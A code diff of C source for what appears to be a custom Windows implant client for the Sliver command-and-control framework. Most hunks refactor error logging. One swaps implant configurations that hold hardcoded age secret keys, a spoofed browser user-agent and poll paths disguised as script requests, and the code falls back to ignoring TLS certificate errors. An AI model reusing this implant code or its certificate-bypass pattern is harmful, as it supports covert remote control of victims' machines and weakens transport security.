@@ -323,7 +323,7 @@ PHTTP_SESSION HttpSessionInit
 	Result->hSession = WinHttpOpen(NULL, dwAccessType, lpProxyName, lpProxyBypass, 0);
 	//Result->hSession = WinHttpOpen(NULL, dwAccessType, L"http://127.0.0.1:8888", L"<local>", 0);
 	if (!Result->hSession) {
-		LogError(L"WinHttpOpen failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpOpen", GetLastError());
 		FreeHttpSession(Result);
 		Result = NULL;
 		goto CLEANUP;
@@ -353,14 +353,14 @@ PHTTP_CLIENT HttpClientInit
 {
 	PHTTP_CLIENT Result = NULL;
 	LPWSTR lpHostName = NULL;
-	
+
 	lpHostName = ConvertCharToWchar(pUri->lpHostName);
 	Result = ALLOC(sizeof(HTTP_CLIENT));
 	Result->pUri = pUri;
 	Result->pHttpSession = HttpSessionInit(pProxyConfig);
 	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
 	if (Result->hConnection == NULL) {
-		LogError(L"WinHttpConnect failed at %s. Last error: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpConnect", GetLastError());
 		FreeHttpClient(Result);
 		Result = NULL;
 	}
@@ -389,7 +389,7 @@ BOOL SetHeader
 
 	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
 	if (!Result) {
-		LogError(L"WinHttpAddRequestHeaders failed at %s. Error code: 0x%08x.\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpAddRequestHeaders", GetLastError());
 	}
 
 	FREE(lpFullHeader);
@@ -430,12 +430,12 @@ HINTERNET SendRequest
 
 	hRequest = WinHttpOpenRequest(This->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
 	if (hRequest == NULL) {
-		LogError(L"WinHttpOpenRequest failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		LOG_ERROR("WinHttpOpenRequest", GetLastError());
 		goto CLEANUP;
 	}
 
 	if (!WinHttpSetTimeouts(hRequest, pRequest->dwResolveTimeout, pRequest->dwConnectTimeout, pRequest->dwSendTimeout, pRequest->dwReceiveTimeout)) {
-		LogError(L"WinHttpSetTimeouts failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		LOG_ERROR("WinHttpSetTimeouts", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -468,11 +468,11 @@ HINTERNET SendRequest
 			goto CLEANUP;
 		}
 
-		LogError(L"WinHttpSendRequest failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
+		LOG_ERROR("WinHttpSendRequest", dwLastError);
 		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
 			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 			if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag))) {
-				LogError(L"WinHttpSetOption failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+				LOG_ERROR("WinHttpSetOption", GetLastError());
 				hRequest = NULL;
 				goto CLEANUP;
 			}
@@ -493,7 +493,7 @@ HINTERNET SendRequest
 			goto CLEANUP;
 		}
 
-		LogError(L"WinHttpReceiveResponse failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpReceiveResponse", dwLastError);
 		WinHttpCloseHandle(hRequest);
 		hRequest = NULL;
 		goto CLEANUP;
@@ -530,7 +530,7 @@ PWINHTTP_PROXY_INFO GetProxyForUrl
 
 	SecureZeroMemory(&AutoProxyOpt, sizeof(AutoProxyOpt));
 	if (!pHttpSession->lpProxyAutoConfigUrl) {
-	//if (FALSE) {
+		//if (FALSE) {
 		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
 		AutoProxyOpt.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
 	}
@@ -544,7 +544,7 @@ PWINHTTP_PROXY_INFO GetProxyForUrl
 	Result = ALLOC(sizeof(WINHTTP_PROXY_INFO));
 	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
 	if (!WinHttpGetProxyForUrl(pHttpSession->hSession, lpFullUri, &AutoProxyOpt, Result)) {
-		LogError(L"WinHttpGetProxyForUrl failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpGetProxyForUrl", GetLastError());
 		FREE(Result);
 		Result = NULL;
 		goto CLEANUP;
@@ -571,10 +571,10 @@ DWORD ReadStatusCode
 	DWORD dwSize = sizeof(dwResult);
 
 	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwResult, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
-		LogError(L"WinHttpQueryHeaders failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
 		return 0;
 	}
-	
+
 	return dwResult;
 }
 
@@ -594,7 +594,7 @@ BOOL ReceiveData
 	do {
 		dwNumberOfBytesAvailable = 0;
 		if (!WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable)) {
-			LogError(L"WinHttpQueryDataAvailable failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			LOG_ERROR("WinHttpQueryDataAvailable", GetLastError());
 			goto END;
 		}
 
@@ -611,7 +611,7 @@ BOOL ReceiveData
 
 		dwNumberOfBytesRead = 0;
 		if (!WinHttpReadData(hRequest, &Buffer[dwTotalSize], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
-			LogError(L"WinHttpReadData failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+			LOG_ERROR("WinHttpReadData", GetLastError());
 			goto END;
 		}
 
@@ -857,7 +857,7 @@ PHTTP_RESP SendHttpRequest
 
 		pHttpRequest->Headers[ContentType] = DuplicateStrA(lpContentType, 0);
 	}
-	
+
 	if (pHttpRequest->Headers[CacheControl] != NULL) {
 		FREE(pHttpRequest->Headers[CacheControl]);
 	}
@@ -904,7 +904,7 @@ PHTTP_RESP SendHttpRequest
 			cbResp = 0;
 		}
 	}
-	
+
 	pResult->hRequest = hRequest;
 	pResult->cbResp = cbResp;
 	pResult->dwStatusCode = dwStatusCode;
@@ -926,7 +926,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	PBYTE pTemp = NULL;
 
 	// Tu dinh config --------------------------------------------------------------------
-	CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
+	/*CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
 	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -938,10 +938,10 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
 	UINT64 uEncoderNonce = 51666;
-	CHAR szSliverClientName[32] = "TALL_MEAT";
+	CHAR szSliverClientName[32] = "TALL_MEAT";*/
 
 	// Laptop config ---------------------------------------------------------------------
-	/*CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
+	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
 	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
 	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
@@ -953,7 +953,7 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
-	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";*/
+	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
 	// END -------------------------------------------------------------------------------
 
 	// Google Drive Config
@@ -1186,7 +1186,7 @@ LPSTR GenNonceQuery
 	}
 
 	return lpResult;
- }
+}
 
 LPSTR CreatePollURL
 (
@@ -1360,7 +1360,7 @@ CLEANUP:
 
 		FREE(pSplittedArray);
 	}
-	
+
 	return pResult;
 }
 
@@ -1384,7 +1384,7 @@ BOOL VerifySign
 	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
 	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
 	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
-		LogError(L"memcmp failed at %s.\n", __FUNCTIONW__);
+		LogError(L"%s.%d: KeyID != pPubKey->KeyId\n", __FILE__, __LINE__);
 		goto CLEANUP;
 	}
 
@@ -1554,7 +1554,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit
 	dwSetCookieLength = sizeof(wszSetCookie);
 	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
 	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
-		LogError(L"WinHttpQueryHeaders failed at %s. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
 		goto CLEANUP;
 	}
 
